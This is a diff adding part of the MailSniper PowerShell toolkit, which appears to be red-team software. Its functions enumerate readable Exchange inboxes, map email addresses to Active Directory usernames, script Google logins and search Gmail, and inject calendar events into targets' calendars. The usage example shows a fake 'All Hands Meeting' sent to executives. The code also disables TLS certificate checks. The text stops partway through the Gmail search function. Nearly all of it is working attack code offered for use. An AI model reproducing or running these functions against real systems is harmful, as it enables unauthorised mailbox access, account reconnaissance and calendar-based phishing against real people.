+  
+  if ($ExchHostname -ne "")
+  {
+    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
+    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
+  }
+  else
+  {
+    ("[*] Autodiscovering email server for " + $Mailbox + "...")
+    $service.AutoDiscoverUrl($Mailbox, {$true})
+  }    
+    
+    try
+    {  
+    $FolderRootConnect = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,'MsgFolderRoot') 
+    }
+    catch
+    {
+    Write-Output "[*] Login appears to have failed. Try the -Remote flag and enter valid credentials when prompted."
+    break
+    }
+    
+    $curr_mbx = 0
+    $count = $Mailboxes.count
+    $OpenMailboxes = @()
+    Write-Output "`n`r"
+    #First we will check to see if there are any public folders available
+    Write-Output "[*] Checking for any public folders..."
+    Write-Output "`n`r"
+    #$publicfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::PublicFoldersRoot,$mbx)
+    $PublicPropSet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
+    $PublicPropSet.Add([Microsoft.Exchange.WebServices.Data.FolderSchema]::Permissions)
+    #adding property set to get Public Folder Path
+    $PR_Folder_Path = new-object Microsoft.Exchange.WebServices.Data.ExtendedPropertyDefinition(26293, [Microsoft.Exchange.WebServices.Data.MapiPropertyType]::String);    
+    $PublicPropSet.Add($PR_Folder_Path)  
+
+    
+
+    $PublicFolders = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,'PublicFoldersRoot',$PublicPropSet) 
+
+    $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
+
+
+    $PublicFolders.Load()
+    $CustomFolderObj = $PublicFolders.FindFolders($folderView) 
+    
+    $foldercollection = @()
+    $publicfolders = @()
+    Foreach($foldername in $CustomFolderObj.Folders)
+    {
+
+        Write-Output ("Found public folder: " + $foldername.DisplayName)
+
+           
+                #Code that needs some modification to get the Folder Path for use when binding to the folder
+                                
+                #$foldpathval = $null    
+                #$folderCollection += $ffFolder  
+                #Try to get the FolderPath Value and then covert it to a usable String 
+                  
+                #if ($foldername.TryGetProperty($PR_Folder_Path,[ref] $foldpathval))    
+                #{    
+                #    $foldpathval
+                #    $binary = [Text.Encoding]::UTF8.GetBytes($foldpathval)    
+                #    $hexArr = $binary | ForEach-Object { $_.ToString("X2") }    
+                #    $hexString = $hexArr -join ''    
+                #    $hexString = $hexString.Replace("FEFF", "5C00")    
+                #    $fpath = ConvertToString($hexString)    
+               #}    
+               # "FolderPath : " + $fpath    
+               #if($foldername.ChildFolderCount -gt 0){  
+               #     $Childfolders = GetPublicFolders -RootFolderId $foldername.Id  
+               #     foreach($Childfolder in $Childfolders){  
+               #         $folderCollection += $Childfolder  
+               #     }  
+               # }  
+              
+
+
+    }
+    $publicfolders
+    Write-Output "`n`r"
+    Write-Output "[*] Checking access to mailboxes for each email address..."
+    Write-Output "`n`r"
+    foreach($mbx in $Mailboxes)
+    {
+        
+        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r" 
+        $curr_mbx += 1
+        $Inbox = ""
+        $msgfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$mbx)
+        $PropSet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
+        $PropSet.Add([Microsoft.Exchange.WebServices.Data.FolderSchema]::Permissions)
+        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$msgfolderroot,$PropSet)
+        $ItemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)
+
+        try
+        {
+            
+            $Item = $service.FindItems($Inbox.Id,$ItemView)  
+            Write-Output "[*] SUCCESS! Inbox of $mbx is readable."
+            $permissions = $Inbox.Permissions
+            if ($AllPerms)
+            {
+                Write-Output "All Permission Settings for Inbox of $mbx"
+                $permissions
+            }
+            else
+            {
+                foreach ($x in $permissions)
+                {
+                    if ($x.UserId.StandardUser -ne $null)
+                    {
+                        Write-Output ("Permission level for " + $x.UserId.StandardUser + " set to: " + $x.PermissionLevel)
+                    }
+                    else
+                    {
+                        Write-Output ("Permission level for " + $x.UserId.DisplayName + " set to: " + $x.PermissionLevel)
+                  
+                    }
+                }
+            }
+            Write-Output ("Subject of latest email in inbox: " + $Item.Subject)
+            
+            
+            $OpenMailboxes += $mbx
+        }
+        catch
+      {
+        $ErrorMessage = $_.Exception.Message
+        continue
+        
+      }
+
+
+    }
+
+    if ($OutFile -ne "")
+    {
+      $OpenMailboxes | Out-File -Encoding ascii $OutFile
+    }
+
+}
+
+function Get-ADUsernameFromEWS{
+
+<#
+  .SYNOPSIS
+
+    This module will connect to a Microsoft Exchange server using Exchange Web Services and use a mailbox to get user contact information.
+
+    MailSniper Function: Get-ADUsernameFromEWS
+    Author: Ralph May (@ralphte01) and Beau Bullock (@dafthack)
+    License: MIT
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to a Microsoft Exchange server using Exchange Web Services and use a mailbox to get user contact information.
+
+  .PARAMETER ExchHostname
+
+    The hostname of the Exchange server to connect to.
+ 
+  .PARAMETER ExchangeVersion
+
+    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
+  
+  .PARAMETER OutFile
+
+    Outputs the results of the search to a file.
+
+  .PARAMETER Remote
+
+  Will prompt for credentials for use with connecting to a remote server such as Office365 or an externally facing Exchange server.
+
+  .PARAMETER EmailAddress
+
+  A single Email Addess of the contact you would like the username of.
+
+  .PARAMETER EmailList
+
+  List of email addresses one per line to get usernames of.
+
+   .PARAMETER Partial
+
+  Will Search for Partial contact matches.
+
+  .PARAMETER AliasOnly
+
+  Will only show the user Alias which is the active directory username.
+  
+
+  .EXAMPLE
+
+    C:\PS> Get-ADUsernameFromEWS -EmailList email-list.txt
+
+    Description
+    -----------
+    This command will attempt to get the Active Directory usernames from EWS.
+
+  .EXAMPLE
+
+    C:\PS> Get-ADUsernameFromEWS -Mailbox email-list.txt -ExchHostname outlook.office365.com -Remote
+
+    Description
+    -----------
+    This command will prompt for credentials and then connect to Exchange Web Services on outlook.office365.com to check each email address in the email-list.txt for their associated usernames. 
+
+#>
+  Param(
+
+    [Parameter(Position = 0, Mandatory = $False)]
+    [system.URI]
+    $ExchHostname = "",
+
+    [Parameter(Position = 1, Mandatory = $False)]
+    [string]
+    $OutFile = "",
+
+    [Parameter(Position = 2, Mandatory = $False)]
+    [string]
+    $ExchangeVersion = "Exchange2010_SP2",
+
+    [Parameter(Position = 3, Mandatory = $False)]
+    [string]
+    $EmailList = "",
+
+    [Parameter(Position = 4, Mandatory = $False)]
+    [switch]
+    $Remote,
+
+    [Parameter(Position=5, Mandatory=$false)] 
+    [string]
+    $EmailAddress,
+
+    [Parameter(Position=6, Mandatory=$False)]
+    [switch]
+    $Partial,
+
+    [Parameter(Position=7, Mandatory=$False)]
+    [switch]
+    $AliasOnly
+
+  )
+  
+  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
+  LoadEWSDLL
+  
+  $ErrorActionPreference = 'silentlycontinue'
+
+  if (($EmailList -eq "") -and ($EmailAddress -eq ""))
+    {
+    Write-Output "[*] Either an EmailList or a single EmailAddress must be specified."
+    break
+    }
+
+  If ($EmailList -ne "") 
+  {
+    $Emails = Get-Content -Path $EmailList
+    $EmailAddress = $Emails[0]
+  } 
+  elseif ($Emails -ne "")
+  {
+    $Emails = $EmailAddress
+  }
+
+  Write-Output "[*] Trying Exchange version $ExchangeVersion"
+  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
+  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
+ 
+  #If the -Remote flag was passed prompt for the user's domain credentials.
+  if ($Remote)
+  {
+    $remotecred = Get-Credential
+    $service.UseDefaultCredentials = $false
+    $service.Credentials = $remotecred.GetNetworkCredential()
+  }
+  else
+  {
+    #Using current user's credentials to connect to EWS
+    $service.UseDefaultCredentials = $true
+  }
+
+  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
+  ## Code From http://poshcode.org/624
+
+  ## Create a compilation environment
+  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
+  $Compiler=$Provider.CreateCompiler()
+  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
+  $Params.GenerateExecutable=$False
+  $Params.GenerateInMemory=$True
+  $Params.IncludeDebugInformation=$False
+  $Params.ReferencedAssemblies.Add("System.DLL") > $null
+
+  $TASource=@'
+    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
+      public class TrustAll : System.Net.ICertificatePolicy {
+        public TrustAll() { 
+        }
+        public bool CheckValidationResult(System.Net.ServicePoint sp,
+          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
+          System.Net.WebRequest req, int problem) {
+          return true;
+        }
+      }
+    }
+'@ 
+  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
+  $TAAssembly=$TAResults.CompiledAssembly
+
+  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
+  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
+  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
+
+  ## end code from http://poshcode.org/624
+
+  
+  if ($ExchHostname -ne "")
+  {
+    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
+    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
+  }
+  else
+  {
+    ("[*] Autodiscovering email server for " + $EmailAddress + "...")
+    $service.AutoDiscoverUrl($EmailAddress, {$true})
+  }    
+    
+    $curr_email = 0
+    $count = $Emails.count
+    
+    Write-Output "`n`r"
+    Write-Output "[*] Getting AD usernames for each email address..."
+    Write-Output "`n`r"
+
+    $allusernames = @()
+
+    foreach($EmailAddress in $Emails)
+    { 
+        $folderid= new-object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Contacts,$EmailAddress)   
+
+	    $Error.Clear();
+	    $cnpsPropset= new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties) 
+	    $ncCol = $service.ResolveName($EmailAddress,$ParentFolderIds,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryOnly,$true,$cnpsPropset);
+	    if($Error.Count -eq 0)
+        {
+		    foreach($Result in $ncCol)
+            {	
+                if(($Result.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent -bor $AliasOnly.IsPresent )
+                {
+                    $Alias = $ncCol.Contact.Alias
+				    Write-Output (("[*] $EmailAddress = ") + ("$Alias "))  
+                    $allusernames += $Alias
+                }
+
+		        elseif(($Result.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent)
+                {
+				    Write-Output $ncCol.Contact
+			    }
+			    else
+                {
+				    Write-host -ForegroundColor Yellow ("Partial Match found but not returned because Primary Email Address doesn't match consider using -Partial " + $ncCol.Contact.DisplayName + " : Subject-" + $ncCol.Contact.Subject + " : Email-" + $Result.Mailbox.Address)
+			    }
+		    }
+        }
+        $curr_email += 1	
+        Write-Host -NoNewline "$curr_email of $count users tested `r"	
+	}
+   if ($OutFile -ne "")
+   {
+   $allusernames | Out-File -Encoding ascii $OutFile
+   }
+}
+
+Function Invoke-InjectGEventAPI{
+
+<#
+
+  .SYNOPSIS
+
+    This module will connect to Google's API using an access token and inject a calendar event into a target's calendar.
+
+    MailSniper Function: Invoke-InjectGEventAPI
+    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to Google's API using an access token and inject a calendar event into a target's calendar.
+    
+    Steps to get a Google API Access Token needed for connecting to the API
+    A. Login to Google
+    B. Go to https://console.developers.google.com/flows/enableapi?apiid=calendar&pli=1
+    C. Create/select a Project and agree to ToS and continue
+    D. Click "Go to Credentials"
+    E. On the "Add credentials to your project" page click cancel
+    F. At the top of the page, select the "OAuth consent screen" tab. Select an Email address, enter a Product name if not already set, and click the Save button.
+    G. Select the Credentials tab, click the Create credentials button and select OAuth client ID.
+    H. Select the application type Web application, under "Authorized redirect URIs" paste in the following address: https://developers.google.com/oauthplayground". Then, click the Create button.
+    I. Copy your "Client ID" and "Client Secret"
+    J. Navigate here: https://developers.google.com/oauthplayground/
+    K. Click the "gear icon" in the upper right corner and check the box to "Use your own OAuth credentials". Enter the OAuth2 client ID and OAuth2 client secret in the boxes.
+    L. Make sure that "OAuth flow" is set to Server-side, and "Access Type" is set to offline.
+    M. Select the "Calendar API v3" dropdown and click both URLs to add them to scope. Click Authorize APIs
+    O. Select the account you want to authorize, then click Allow. (If there is an error such as "Error: redirect_uri_mismatch" then it's possible the changes haven't propagated yet. Just wait a few minutes, hit the back button and try to authorize again.)
+    P. You should now be at "Step 2: Exchange authorization code for tokens." Click the "Exchange authorization code for tokens button". The "Access token" is item we need for accessing the API. Copy the value of the "Access token."
+
+
+  .PARAMETER PrimaryEmail  
+        
+        Email address of the Google account you are doing the injection as. (Attacker email address)     
+
+  .PARAMETER AccessToken      
+
+        Google API Access Token. See the steps above to generate one of these.
+        
+  .PARAMETER EventTitle
+
+        Title of the Google event.
+
+  .PARAMETER Targets 
+
+        Comma-seperated list of email addresses to inject the event into.
+
+  .PARAMETER EventLocation
+
+        Location field for the event.
+
+  .PARAMETER EventDescription
+
+        Description field for the event.
+
+  .PARAMETER StartDateTime  
+  
+        Start date and time for the event in the format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:00:00 for October 22, 2017 at 6:00:00 PM
+
+  .PARAMETER EndDateTime 
+
+        End date and time for the event in the format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:30:00 for October 22, 2017 at 6:30:00 PM
+  
+  .PARAMETER TimeZone  
+  
+        Time zone for the event in the format "America/New_York"
+
+  .PARAMETER allowModify 
+  
+        If set to true allows targets to modify the calendar entry
+
+  .PARAMETER allowInvitesOther  
+  
+        If set to true allows targets to invite others to the calendar entry
+
+  .PARAMETER showInvitees 
+  
+        If set to true will show all guests added to the event
+     
+  .PARAMETER ResponseStatus 
+  
+        "accepted"  #Can be "needsAction", "declined", "tentative", or "accepted"
+
+
+    .EXAMPLE
+    PS C:\> Invoke-InjectGEventAPI -PrimaryEmail your-api-email-address@gmail.com -AccessToken 'Insert your access token here' -Targets "CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com" -StartDateTime 2017-10-22T17:20:00 -EndDateTime 2017-10-22T17:30:00 -EventTitle "All Hands Meeting" -EventDescription "Please review the agenda at the URL below prior to the meeting." -EventLocation "Interwebz"
+
+
+#>
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $PrimaryEmail = "",       
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $AccessToken = "",        
+        
+        [Parameter(Position = 2, Mandatory = $false)]
+        [string]
+        $EventTitle = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $Targets = "", 
+
+        [Parameter(Position = 4, Mandatory = $false)]
+        [string]
+        $EventLocation = "",
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [string]
+        $EventDescription = "",
+
+        [Parameter(Position = 6, Mandatory = $true)]
+        [string]
+        $StartDateTime = "", #format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:00:00 for October 22, 2017 at 6:00:00 PM
+
+        [Parameter(Position = 7, Mandatory = $true)]
+        [string]
+        $EndDateTime = "",   #format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:30:00 for October 22, 2017 at 6:30:00 PM
+
+        [Parameter(Position = 8, Mandatory = $false)]
+        [string]
+        $TimeZone = "America/New_York",
+
+        [Parameter(Position = 9, Mandatory = $false)]
+        [string]
+        $allowModify = "false", #if set to true allows targets to modify the calendar entry
+
+        [Parameter(Position = 10, Mandatory = $false)]
+        [string]
+        $allowInvitesOther = "true", #if set to true allows targets to invite others to the calendar entry
+
+        [Parameter(Position = 11, Mandatory = $false)]
+        [string]
+        $showInvitees = "false",  #if set to true will show all guests added to the event
+     
+        [Parameter(Position = 12, Mandatory = $false)]
+        [string]
+        $ResponseStatus = "accepted"  #Can be "needsAction", "declined", "tentative", or "accepted"
+
+    )
+
+        #Crafting the JSON body
+
+        $targetsarray = $targets -split ","
+        foreach($target in $targetsarray)
+        {
+            $GEventBody = @{
+                kind = "calendar#event";
+                start = @{ dateTime = "$StartDateTime"; timeZone = "$TimeZone"};
+                end = @{ dateTime = "$EndDateTime"; timeZone = "$TimeZone"};
+                summary = "$EventTitle";
+                description = "$EventDescription";
+                location = "$EventLocation";
+                attendees = @(
+                    @{email= "$Target"; responseStatus = "$ResponseStatus"}
+                    );
+                guestsCanInviteOthers = "$allowInvitesOther";
+                guestsCanSeeOtherGuests = "$showInvitees";
+                guestsCanModify = "$allowModify"
+
+            }
+
+            $GEventHeaders = @{'Accept'='*/*';'Content-Type'='application/json';'Authorization'= "Bearer $AccessToken"}
+
+            #Injecting event into calendar
+            Write-Output "[*] Now injecting event into target calendar(s): $Target"
+            $CalendarInjection = Invoke-RestMethod -Uri "https://www.googleapis.com/calendar/v3/calendars/$PrimaryEmail/events" -Method POST -Headers $GEventHeaders -Body (ConvertTo-Json $GEventBody)
+        }
+}
+
+Function Invoke-InjectGEvent{
+
+<#
+.SYNOPSIS
+
+    This module will connect to Google using a set of user credentials and inject a calendar event into a target's calendar.
+
+    MailSniper Function: Invoke-InjectGEvent
+    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to Google using a set of user credentials and inject a calendar event into a target's calendar.
+   
+  .PARAMETER EmailAddress  
+        
+        Email address of the Google account you are doing the injection as. (Attacker email address)     
+
+  .PARAMETER Password      
+
+        Password for the account to auth to Google.
+        
+  .PARAMETER EventTitle
+
+        Title of the Google event.
+
+  .PARAMETER Targets 
+
+        Comma-seperated list of email addresses to inject the event into.
+
+  .PARAMETER EventLocation
+
+        Location field for the event.
+
+  .PARAMETER EventDescription
+
+        Description field for the event.
+
+  .PARAMETER StartDateTime  
+  
+        Start date and time for the event in the format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+
+  .PARAMETER EndDateTime 
+
+        End date and time for the event in the format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+  
+  .PARAMETER TimeZone  
+  
+        Time zone for the event in the format "America/New_York"
+
+  .PARAMETER allowModify 
+  
+        If set to true allows targets to modify the calendar entry
+
+  .PARAMETER allowInvitesOther  
+  
+        If set to true allows targets to invite others to the calendar entry
+
+  .PARAMETER showInvitees 
+  
+        If set to true will show all guests added to the event
+     
+
+    .EXAMPLE
+    PS C:\> Invoke-InjectGEvent -EmailAddress your-google-email-address@gmail.com -Password 'Password for the Google Account' -Targets "CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com" -StartDateTime 20171022T172000 -EndDateTime 20171022T173000 -EventTitle "All Hands Meeting" -EventDescription "Please review the agenda at the URL below prior to the meeting." -EventLocation "Interwebz"
+
+
+#>
+
+
+    Param
+    (
+        
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password = "",
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [string]
+        $EventTitle = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $Targets = "",
+
+        [Parameter(Position = 4, Mandatory = $false)]
+        [string]
+        $EventLocation = "",
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [string]
+        $EventDescription = "",
+
+        [Parameter(Position = 6, Mandatory = $true)]
+        [string]
+        $StartDateTime = "", #format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+
+        [Parameter(Position = 7, Mandatory = $true)]
+        [string]
+        $EndDateTime = "",   #format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
+
+        [Parameter(Position = 8, Mandatory = $false)]
+        [string]
+        $TimeZone = "America/New_York",
+
+        [Parameter(Position = 9, Mandatory = $false)]
+        [string]
+        $allowModify = "false", #if set to true allows targets to modify the calendar entry
+
+        [Parameter(Position = 10, Mandatory = $false)]
+        [string]
+        $allowInvitesOther = "true", #if set to true allows targets to invite others to the calendar entry
+
+        [Parameter(Position = 11, Mandatory = $false)]
+        [string]
+        $showInvitees = "false",  #if set to true will show all guests added to the event
+
+        [Parameter(Position = 12, Mandatory = $false)]
+        [string]
+        $userStatus = "false",  
+
+        [Parameter(Position = 13, Mandatory = $false)]
+        [string]
+        $createdBySet = "false"  
+
+    )
+
+        #Start a new Google session and input the email address of the user who will be creating the event
+        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $EmailForm = $SessionRequest.Forms[0]
+        $EmailForm.Fields["Email"]= $EmailAddress
+        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+
+        #Submit the authentication for the user and maintain a valid session in $googlesession
+        $PasswordForm = $EmailSubmitRequest.Forms[0]
+        $PasswordForm.Fields["Email"]= $EmailAddress
+        $PasswordForm.Fields["Passwd"]= $Password
+        Write-Output "[*] Now logging into account with provided credentials"
+        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
+        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
+        foreach ($cookie in $cookies)
+        {
+            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
+            {
+                $PrimarySIDExists = $true
+            }
+        }
+        if ($PrimarySIDExists)
+        {
+            Write-Output "[*] Authentication appears to be successful"
+        }
+        else
+        {
+            Write-Output "[*] Authentication appears to have failed. Check the credentials."       
+            break
+        }
+
+        #Navigate to the Google Calendar and obtain the 'secid' that is necessary for POSTing events
+        Write-Output "[*] Obtaining 'secid' for POSTing to calendar"
+        $CalendarLoad = Invoke-WebRequest -Uri ("https://calendar.google.com/calendar/render") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
+        #$secidline = $CalendarLoad.tostring() -split "[`r`n]" | select-string 'null,null,null,0]'
+        $CalendarLoad.tostring() -match "(?<=window\['INITIAL_DATA'\]\ =\ )(?s).*(?=\n;)" | out-null
+        $json = ConvertFrom-Json $Matches[0]
+        $secid = $json[26]
+
+        #$GEventParams = @{'sf'='true';'output'='js';'action'='CREATE';'useproto'='true';'add'=$Targets;'crm'='BUSY';'icc'='DEFAULT';'sprop'='goo.allowModify:false';'pprop'='eventColor:none';'text'=$EventTitle;'location'=$EventLocation;'details'=$EventDescription;'src'='';'dates'=($StartDateTime + "/" + $EndDateTime);'unbounded'='false';'scp'='ONE';'hl'='en';'stz'=$TimeZone;'secid'=$secid}
+        $Dates = ($StartDateTime + "/" + $EndDateTime)
+        $GEventHeaders = @{'Accept'='*/*';'X-If-No-Redirect'='1';'X-Is-Xhr-Request'='1';'Content-Type'='application/x-www-form-urlencoded;charset=utf-8';'Referer'='https://calendar.google.com/calendar/render?pli=1';'Accept-Language'='en-US';'Accept-Encoding'='gzip; deflate';'User-Agent'='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv=11.0) like Gecko';'Host'='calendar.google.com';'Cache-Control'='no-cache'}
+        $GEventParams = "text=$EventTitle&output=js&useproto=true&hl=en&dates=$Dates&location=$EventLocation&pprop=eventColor%3Anone&add=$Targets&status=1&crm=BUSY&icc=DEFAULT&scp=ONE&action=CREATE&details=$EventDescription&sprop=goo.allowModify%3A$allowModify&sprop=goo.allowInvitesOther:$AllowInvitesOther&sprop=goo.showInvitees:$ShowInvitees&sprop=goo.userStatus:$userStatus&sprop=goo.createdBySet:$createdBySet&stz=$TimeZone&secid=$secid&sf=true&src=&unbounded=false"
+
+        #Injecting event into calendar
+        Write-Output "[*] Now injecting event into target calendar(s): $Targets"
+        $CalendarInjection = Invoke-WebRequest -Uri "https://calendar.google.com/calendar/event" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body $GEventParams
+
+        $EventCreationResponse = $CalendarInjection.RawContent -split '\\"'
+        $EventID = $EventCreationResponse[1]
+
+        #Entry verification
+        $CheckingEventExists = Invoke-WebRequest -Uri "https://calendar.google.com/calendar/event" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body "eid=$EventID&sf=true&secid=$secid"
+        [xml]$EventXmlOutput = $CheckingEventExists.Content
+        
+        if($EventXmlOutput.eventpage.eid.value -ne $EventID)
+        {
+            Write-Output "`nLooks like something may have gone wrong. Maybe login to G-Calendar directly and check to see if the event was created."
+        }
+        else
+        {
+            Write-Output "`n[*] Success! The details for the event are below`n"
+            $confirmedeid = $EventXmlOutput.eventpage.eid.value
+            $confirmedtitle = $EventXmlOutput.eventpage.summary.value
+            $confirmedlocation = $EventXmlOutput.eventpage.location.value
+            $confirmeddescription = $EventXmlOutput.eventpage.description.value
+            $confirmeddates = $EventXmlOutput.eventpage.dates.display
+            $confirmedtimezone = $EventXmlOutput.eventpage.timezone.value
+            $attendeelist = $EventXmlOutput.eventpage.attendees.attendee.principal.display
+            $eventcreator = $EventXmlOutput.eventpage.creator.principal.value
+
+            Write-Output "[+] Title : $confirmedtitle"
+            Write-Output "[+] Location : $confirmedlocation"
+            Write-Output "[+] Description : $confirmeddescription"
+            Write-Output "[+] Dates : $confirmeddates"
+            Write-Output "[+] Timezone : $confirmedtimezone"
+            Write-Output "[+] Attendees : $attendeelist"
+            Write-Output "[+] Creator : $eventcreator"
+            Write-Output "[+] EventID : $confirmedeid"
+        }
+}
+
+Function Invoke-SearchGmail{
+<#
+    .SYNOPSIS
+
+    This module will connect to Google using a set of user credentials and search a user's inbox for certain terms.
+
+    MailSniper Function: Invoke-SearchGmail
+    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to Google using a set of user credentials and search a user's inbox for certain terms.
+
+        .EXAMPLE
+        
+            PS C:> Invoke-SearchGmail -EmailAddress email@gmail.com -Password Summer2017 -Search search-term -OutputCsv out.csv
+#>
+
+
+    Param
+    (
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password = "",
+
+        [Parameter(Position = 2, Mandatory = $true)]
+        [string]
+        $Search = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $OutputCsv = ""
+    )
+
+        #Start a new Google session and input the email address of the user who will be creating the event
+        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $EmailForm = $SessionRequest.Forms[0]
+        $EmailForm.Fields["Email"]= $EmailAddress
+        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+
+        #Submit the authentication for the user and maintain a valid session in $googlesession
+        $PasswordForm = $EmailSubmitRequest.Forms[0]
+        $PasswordForm.Fields["Email"]= $EmailAddress
+        $PasswordForm.Fields["Passwd"]= $Password
+        Write-Output "[*] Now logging into account with provided credentials"
+        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
+        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
+        foreach ($cookie in $cookies)
+        {
+            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
+            {
+                $PrimarySIDExists = $true
+            }
+        }
+        if ($PrimarySIDExists)
+        {
+            Write-Output "[*] Authentication appears to be successful"
+        }
+        else
+        {
+            Write-Output "[*] Authentication appears to have failed. Check the credentials."
+            break
+        }
+
+        #Get ik param needed in search
+        Write-Output "[*] Now searching Gmail account $EmailAddress for: $Search"
+        $GetIKParam = 's_jr=[null,[[null,null,null,null,null,null,[null,true,false]],[null,[null,"test",0,null,30,null,null,null,false,[],[]]]],2,null,null,null,""]'
